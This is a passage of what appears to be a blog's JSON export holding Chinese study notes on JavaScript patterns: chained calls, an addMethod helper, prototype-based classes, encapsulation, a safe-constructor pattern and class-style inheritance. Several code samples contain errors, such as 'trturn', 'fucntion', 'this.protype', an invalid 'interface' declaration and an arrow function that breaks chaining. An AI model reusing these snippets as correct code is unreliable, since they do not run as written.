class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this.prototype[name] = fn;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 顺便支持`链式调用`</span><br><span class=\"line\">var fn = function() &#123;&#125;;</span><br><span class=\"line\">fn.addMethod(&apos;fn1&apos;, function() &#123;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;).addMethod(&apos;fn2&apos;, function() &#123;</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 调用时需要注意</span><br><span class=\"line\">var fns = new fn();</span><br><span class=\"line\">fns.fn1();</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h2><p>JS是一种<code>灵活</code>的语言, <code>函数</code>扮演一等公民。使用JS可以编写出更多<code>优雅的艺术代码</code>。</p>\n<p><strong>忆之获:</strong> 函数 多样化 创建/使用. <code>灵活性</code>是语言特有气质。团队开发慎重，尽量保证团队代码风格一致。易开发、可维护、代码规范必然要求。</p>\n<p><strong>问答:</strong></p>\n<ul>\n<li><p><strong>问： <a href=\"#1.5真假对象\">1.5真假对象</a> 一节中如何实现方法链式调用?</strong>\\<br>答：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;</span><br><span class=\"line\">  return &#123;</span><br><span class=\"line\">    fn1: function() &#123;</span><br><span class=\"line\">      return this;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    fn2: () =&gt; &#123;</span><br><span class=\"line\">      return this;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var fn = fnObj();</span><br><span class=\"line\">fn.fn1().fn2();</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>问：试定义一个可为函数添加多方法的<code>addMethod</code>方法。</strong>\\<br>答：参考<a href=\"#1.10链式添加\">1.10链式添加</a></p>\n<p><strong>方式一</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this[name] = fn;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 顺便支持`链式调用`</span><br><span class=\"line\">var fn = function() &#123;&#125;;</span><br><span class=\"line\">fn.addMethod(&apos;fn1&apos;, function() &#123;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;).addMethod(&apos;fn2&apos;, function() &#123;</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">fn.fn1().fn2();</span><br></pre></td></tr></table></figure>\n<p><strong>方式二</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 定义 参数类型 接口</span><br><span class=\"line\">interface opt = &#123;</span><br><span class=\"line\">  fnName: string,</span><br><span class=\"line\">  fn: function</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 支持 一次性 创建多个方法</span><br><span class=\"line\">Function.prototype.addMethod = function(options: opt[]) &#123;</span><br><span class=\"line\">  for(obj of options) &#123;</span><br><span class=\"line\">    this[obj.fnName] = obj.fn;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  trturn this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var methods = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fnName: &apos;fn1&apos;,</span><br><span class=\"line\">    fn: function() &#123;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fnName: &apos;fn2&apos;,</span><br><span class=\"line\">    fn: () =&gt; &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">var &apos;自定义Fn&apos; = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&apos;自定义Fn&apos;.addMethod(methods);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>问：试定义一个既可为函数添加多方法,又可为原型添加方法的<code>addMethod</code>方法。</strong>\\<br>答：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 定义 参数类型 接口</span><br><span class=\"line\">interface opt = &#123;</span><br><span class=\"line\">  fnName: string,</span><br><span class=\"line\">  fn: function</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 支持 一次性 创建多个方法</span><br><span class=\"line\">Function.prototype.addMethod = function(options: opt[], proto: string) &#123;</span><br><span class=\"line\">  if(proto === &quot;prototype&quot;) &#123;</span><br><span class=\"line\">    for(obj of options) &#123;</span><br><span class=\"line\">      this.protype[obj.fnName] = obj.fn;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    for(obj of options) &#123;</span><br><span class=\"line\">      this[obj.fnName] = obj.fn;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  trturn this;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"第二章-面向对象编程\"><a href=\"#第二章-面向对象编程\" class=\"headerlink\" title=\"第二章 面向对象编程\"></a><strong>第二章 面向对象编程</strong></h1><h2 id=\"2-1-面向对象-面向过程\"><a href=\"#2-1-面向对象-面向过程\" class=\"headerlink\" title=\"2.1 面向对象 面向过程\"></a>2.1 <code>面向对象</code> <code>面向过程</code></h2><p>面向对象编程 就是 将 需求 抽象成一个对象, 针对对象分析 特征(属性) / 动作(方法). 这个对象称为<code>类</code>.</p>\n<p><strong>核心思想：</strong><code>封装</code> <code>继承</code> <code>多继承</code> <code>多态</code></p>\n<h2 id=\"2-2-包装明星–封装\"><a href=\"#2-2-包装明星–封装\" class=\"headerlink\" title=\"2.2 包装明星–封装\"></a>2.2 包装明星–封装</h2><h3 id=\"2-2-1-创建一个类\"><a href=\"#2-2-1-创建一个类\" class=\"headerlink\" title=\"2.2.1 创建一个类\"></a>2.2.1 创建一个类</h3><p>首先声明一个函数，保存在一个变量里. 按编程习惯，将类名首字母大写.<br>然后在函数(类)内部通过对<code>this</code>(函数内部自带变量，用于指向当前对象)变量添加 属性/方法，实现对类添加<code>属性/方法</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var Book = function(id, bookName, price) &#123;</span><br><span class=\"line\">  this.id = id;</span><br><span class=\"line\">  this.bookName = bookName;</span><br><span class=\"line\">  this.price = price;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>也可通过<code>类</code>的原型(类本身也是对象，所以也有原型<code>prototype</code>)上添加<code>属性/方法</code>.\\<br>两种方式：</p>\n<p>①为原型对象属性赋值<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Book.prototype.show = function() &#123;&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>②将一个对象赋值给类的原型对象.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Book.prototype = &#123;</span><br><span class=\"line\">  show: function() &#123;&#125;,</span><br><span class=\"line\">  fn2: function() &#123;&#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>两种模式不能混用</p>\n<p>使用时需要<code>new</code>关键字，实例化(创建)新对象.</p>\n<p><strong>关于对实例方法和原型方法解释：</strong><br>通过<code>this</code>添加的<code>方法/属性</code>，是在当前对象上添加的\\<br>JS是一种基于<code>prototype</code>原型的语言, 每创建一个对象(函数也是一种对象),都有一个prototype原型用于指向 其继承的 属性/方法. 通过prototype继承方法非对象自身所有，需要通过prototype逐级查找。<br>通过<code>this</code>定义的<code>方法/属性</code>，是对象自身拥有, 每次通过<code>类</code>创建新对象实例时，都会复制<code>类</code>本身方法、属性\\<br>prototype上方法/属性是继承来,状态共享, 不会被多次创建。</p>\n<h3 id=\"2-2-2-属性与方法封装\"><a href=\"#2-2-2-属性与方法封装\" class=\"headerlink\" title=\"2.2.2 属性与方法封装\"></a>2.2.2 属性与方法封装</h3><p>理解：</p>\n<ol>\n<li><p>通过JS函数作用域 实现 函数内部创建<br>面向对象思想:</p>\n<p><code>属性/方法</code> 的 隐藏、暴露, <code>私有属性/私有方法、公有属性/公有方法、保护属性/保护方法</code></p>\n</li>\n</ol>\n<p>JS通过<code>函数作用域</code>实现<code>私有属性/私有方法</code>;</p>\n<p><code>this</code>创建<code>公有属性/公有方法</code>, 通过<code>this</code>创建的公有方法，可以访问<code>类(创建时)||对象</code>的<code>私有属性/私有方法</code>, 由于这些方法权利比较大, 又称为<code>特权方法</code>;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 私有属性/私有方法, 特权方法, 对象公有属性/对象公有方法, 构造器</span><br><span class=\"line\">var Book = fucntion(id, name, price) &#123;</span><br><span class=\"line\">  // 私有属性</span><br><span class=\"line\">  var num = 1;</span><br><span class=\"line\">  // 私有方法</span><br><span class=\"line\">  function checkId() &#123;&#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  // 特权方法</span><br><span class=\"line\">  this.getName = function() &#123;&#125;;</span><br><span class=\"line\">  this.getPrice = function() &#123;&#125;;</span><br><span class=\"line\">  this.setName = function() &#123;&#125;;</span><br><span class=\"line\">  this.setPrice = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 对象公有属性</span><br><span class=\"line\">  this.id = id;</span><br><span class=\"line\">  // 对象公有方法</span><br><span class=\"line\">  this.copy = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 构造器</span><br><span class=\"line\">  this.setName(name);</span><br><span class=\"line\">  this.setPrice(price);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>理解：</p>\n<ol>\n<li>通过JS<code>函数作用域</code>特征，来实现 函数内部创建 外部无法访问的<code>私有变量/私有方法</code></li>\n<li>通过<code>new</code>关键字，实例化对象时，会对<code>类</code>执行一次，所以<code>类</code>内部<code>this</code>上定义的<code>属性/方法</code>自然可复制到 新创建对象上，成为 <code>对象公有属性/公有方法</code> </li>\n<li>其中一些方法能访问到 <code>类</code>的<code>私有属性/私有方法</code>, 比外界权利大，得名<code>特权方法</code></li>\n<li>通过<code>new</code>关键字 实例化对象 时，执行了一遍<code>类</code>的函数，里面通过调用<code>特权方法</code>，初始化对象的一些属性。</li>\n<li><code>类</code>外部通过 点语法 定义 属性/方法: 通过<code>new</code>关键字创建新对象时，由于<code>类</code>外面通过 点语法 定义的<code>属性/方法</code>没有执行到，所以 <code>新创建对象中无法获取</code>，但可通过<code>类</code>来使用，因此在类外面通过 点语法 定义的 属性/方法 被称为 <code>类的静态公有属性/静态公有方法</code></li>\n<li><code>类</code>通过<code>prototype</code>创建的<code>属性/方法</code>在<code>类实例对象</code>中可通过this访问(新创建对象<em>proto</em>指向类的原型所指向的对象), 所以将<code>prototype</code>对象中<code>属性/方法</code>称为<code>公有属性/公有方法</code></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 类静态公有属性(实例对象不能访问)</span><br><span class=\"line\">Book.isChinese = true;</span><br><span class=\"line\">// 类静态公有方法(实例对象不能访问)</span><br><span class=\"line\">Book.fn1 = function()&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Book.prototype = &#123;</span><br><span class=\"line\">  // 公有属性</span><br><span class=\"line\">  isBook: false,</span><br><span class=\"line\">  // 公有方法</span><br><span class=\"line\">  fn2: function() &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过<code>new</code>关键字创建的对象 <strong>实质</strong> 是对 新对象<code>this</code>的不断赋值，并将prototype指向 类的prototype 所指向的对象。</p>\n<p>类的构造函数 外，通过点语法定义的属性/方法 是不会添加到 新创建 对象上去的。</p>\n<p>想要在新创建对象中使用静态公有属性，得通过 类本身，不能通过this。</p>\n<p>类的原型上定义的属性在 新对象里 可直接使用，因为 新对象 prototype和 类 的 prototype 指向同一对象</p>\n<p>类私有属性 和 静态方法 在 实例对象中访问不到</p>\n<p>公有属性在实例对象中可通过 点语法 访问到</p>\n<h3 id=\"2-2-3-闭包实现\"><a href=\"#2-2-3-闭包实现\" class=\"headerlink\" title=\"2.2.3 闭包实现\"></a>2.2.3 闭包实现</h3><p>类的静态变量 通过闭包实现</p>\n<h3 id=\"2-2-4-创建对象的安全模式\"><a href=\"#2-2-4-创建对象的安全模式\" class=\"headerlink\" title=\"2.2.4 创建对象的安全模式\"></a>2.2.4 创建对象的安全模式</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 创建一个图书类</span><br><span class=\"line\">var Book = function(title, time, type) &#123;</span><br><span class=\"line\">  this.title = title;</span><br><span class=\"line\">  this.time = time;</span><br><span class=\"line\">  this.type = type;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 实例化一本书</span><br><span class=\"line\">var book1 = Book(&apos;js&apos;, &apos;2018&apos;, &apos;js&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(book); // undefined</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(window.title);  // js</span><br><span class=\"line\">console.log(window.time);   // 2018</span><br><span class=\"line\">console.log(window.type);   // js</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<ol>\n<li>new关键字作用 可看做 对当前对象 this 不停赋值，例中 没有用new, 直接执行函数在全局作用域，this指向 全局变量window;</li>\n<li>变量book 最终作用 得到Book类(函数)执行结果, 函数没有return语句, 变量book 得不到 Book类 的返回值, 遂为 undefined</li>\n</ol>\n<p><strong>安全模式 || 检察长模式</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var Book = function(title, time, type) &#123;</span><br><span class=\"line\">  // 判断执行过程中 this 是否为 当前对象(为true说明是用 new关键字 创建)</span><br><span class=\"line\">  if(this instanceof Book)&#123;</span><br><span class=\"line\">    this.title = title;</span><br><span class=\"line\">    this.time = time;</span><br><span class=\"line\">    this.type = type;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // 否则重新创建对象并返回</span><br><span class=\"line\">    return new Book(title, time, type);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>总结：<br>每个类有 3部分</p>\n<ol>\n<li>第一部分是构造函数内，供实例化对象复制</li>\n<li>第二部分是构造函数外，直接通过点语法添加，供类直接使用，实例化对象访问不到</li>\n<li>第三部分是类的原型中，实例化对象可通过原型链间接访问，为所有实例化对象共用</li>\n</ol>\n<h2 id=\"2-3-继承\"><a href=\"#2-3-继承\" class=\"headerlink\" title=\"2.3 继承\"></a>2.3 继承</h2><h3 id=\"2-3-1-子类原型对象–类式继承\"><a href=\"#2-3-1-子类原型对象–类式继承\" class=\"headerlink\" title=\"2.3.1 子类原型对象–类式继承\"></a>2.3.1 子类原型对象–类式继承</h3><p><strong>类式继承</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 声明父类</span><br><span class=\"line\">function SuperClass() &#123;</span><br><span class=\"line\">  this.superValue = true;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 为父类添加公有方法</span><br><span class=\"line\">SuperClass.prototype.getSuperValue = function() &#123;</span><br><span class=\"line\">  return this.superValue;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 声明子类</span><br><span class=\"line\">function SubClass() &#123;</span><br><span class=\"line\">  this.subValue = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 继承父类</span><br><span class=\"line\">SubClass.prototype = new SuperClass();</span><br><span class=\"line\">// 先继承，再为子类添加公有方法</span><br><span class=\"line\">SubClass.prototype.getSubValue = function() &#123;</span><br><span class=\"line\">  return this.subValue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 以上 类似`封装`的过程</span><br></pre></td></tr></table></figure></p>\n<p>总结：<br>类式继承 需要将 第一个类的实例 赋值给 第二个 类的原型\\<br>类的原型对象 作用是 为类的原型添加公有方法，类不能直接访问原型中的<code>属性/方法</code>，必须通过 原型prototype 来访问。\\<br>实例化一个父类时，新创建对象复制了父类构造函数内 属性/方法， 并且将 原型<em>proto</em> 指向父类原型对象， 如此便拥有 父类 原型对象/构造函数 上 属性/方法，</p>\n<p><strong>instanceof判断<code>对象</code>与<code>类</code>继承关系</strong>\\<br><code>instanceof</code>通过判断对象<code>prototype链</code>来确定<code>对象</code>是否为<code>某类</code>实例，不关心<code>对象</code>与<code>类</code>自身结构</p>\n<blockquote>\n<p>console.log(obj instanceof Class); // true<br>console.log(SubClass instanceof ParentClass); // false</p>\n</blockquote>\n<p>instanceof 判断 前面对象是否为 后面 类(对象)实例，不表示两者的继承\\<br>子类 继承 父类 时通过将 父类实例 赋值给 子类原型prototype, 子类原型 继承 父类 </p>\n<blockquote>\n<p>console.log(SubClass.prototype instanceof ParentClass); // true</p>\n</blockquote>\n<p>所有<code>对象</code>都继承自<code>Object</code>原生对象构造函数</p>\n<blockquote>\n<p>console.log(allObj instanceof Object); // true</p>\n</blockquote>\n<h4 id=\"类式继承缺点\"><a href=\"#类式继承缺点\" class=\"headerlink\" title=\"类式继承缺点\"></a>类式继承缺点</h4><ol>\n<li><code>子类</code>通过<code>原型prototype</code>对<code>父类实例化</code>, 继承父类。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"第一章-灵活语言–JavaScript\"><a href=\"#第一章-灵活语言–JavaScript\" class=\"headerlink\" title=\"第一章 灵活语言–JavaScript\"></a><strong>第一章 灵活语言–JavaScript</strong></h1><h2 id=\"1-1-全局变量-命名函数\"><a href=\"#1-1-全局变量-命名函数\" class=\"headerlink\" title=\"1.1 全局变量 命名函数\"></a><strong>1.1 全局变量 命名函数</strong></h2><blockquote>\n<p>function fnName() {}</p>\n</blockquote>\n<h2 id=\"1-2-全局变量-函数表达式\"><a href=\"#1-2-全局变量-函数表达式\" class=\"headerlink\" title=\"1.2 全局变量 函数表达式\"></a><strong>1.2 全局变量 函数表达式</strong></h2><blockquote>\n<p>var fnName = function() {}</p>\n</blockquote>\n<p>ps：全局变量污染全局作用域，容易被覆盖</p>\n<h2 id=\"1-3-对象收编变量\"><a href=\"#1-3-对象收编变量\" class=\"headerlink\" title=\"1.3 对象收编变量\"></a><strong>1.3 对象收编变量</strong></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = &#123;</span><br><span class=\"line\">  fn1: function() &#123;&#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-4-对象另一种形式\"><a href=\"#1-4-对象另一种形式\" class=\"headerlink\" title=\"1.4 对象另一种形式\"></a><strong>1.4 对象另一种形式</strong></h2><p>JS万事万物皆对象，函数也是对象</p>\n<p>首先声明一个对象, 然后添加方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\">fnObj.fn1 = function() &#123;&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>ps: 对象不能复制, <code>new</code> 关键字 创建新对象，新对象不能继承方法</p>\n<h2 id=\"1-5真假对象\"><a href=\"#1-5真假对象\" class=\"headerlink\" title=\"1.5真假对象\"></a><strong>1.5真假对象</strong></h2><p>简单复制，将方法放在一个函数对象中<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;</span><br><span class=\"line\">  return &#123;</span><br><span class=\"line\">    fn1: function() &#123;&#125;,</span><br><span class=\"line\">    fn2: () =&gt; &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = fnObj();</span><br><span class=\"line\">a.fn1();</span><br></pre></td></tr></table></figure></p>\n<p>ps: 每次调用返回新对象, 状态不会互相干扰 / 新创建对象 和 <code>fnObj</code> 没有任何关系</p>\n<h2 id=\"1-6-类\"><a href=\"#1-6-类\" class=\"headerlink\" title=\"1.6 类\"></a><strong>1.6 类</strong></h2><p><code>1.5假对象</code>新创建对象 和<code>fnObj</code>没有任何关系<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;</span><br><span class=\"line\">  this.fn1 = function()&#123;&#125;</span><br><span class=\"line\">  this.fn2 = () =&gt; &#123;&#125;</span><br><span class=\"line\">  this.fn3 = arguments =&gt; &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var a = new fnObj();</span><br><span class=\"line\">a.fn1();</span><br></pre></td></tr></table></figure></p>\n<p>用类创建对象</p>\n<h2 id=\"1-7-检测类\"><a href=\"#1-7-检测类\" class=\"headerlink\" title=\"1.7 检测类\"></a><strong>1.7 检测类</strong></h2><p>所有方法放在 函数内部 通过<code>this</code>定义。\\<br>每次通过<code>new</code>关键字创建新对象，<code>新对象</code>对<code>类</code>的<code>this</code>上的<code>属性/方法</code>进行复制。新创建对象 都有自己的一套方法，<strong>但是</strong>造成的消耗很奢侈。</p>\n<p><strong>第一种方法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\">fnObj.prototype.fn1 = function() &#123;&#125;;</span><br><span class=\"line\">fnObj.prototype.fn2 = () =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>实例 共享<code>prototype</code>上<code>属性/方法</code></p>\n<p><strong>第二种方法</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">fnObj.prototype = &#123;</span><br><span class=\"line\">  fn1: function() &#123;&#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>两种方法不能混用，第二种覆盖第一种.</p>\n<h2 id=\"1-8-方法的链式调用\"><a href=\"#1-8-方法的链式调用\" class=\"headerlink\" title=\"1.8 方法的链式调用\"></a><strong>1.8 方法的链式调用</strong></h2><p>在声明的 每个方法末尾 将当前对象返回，JS中<code>this</code>关键字指向当前对象<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 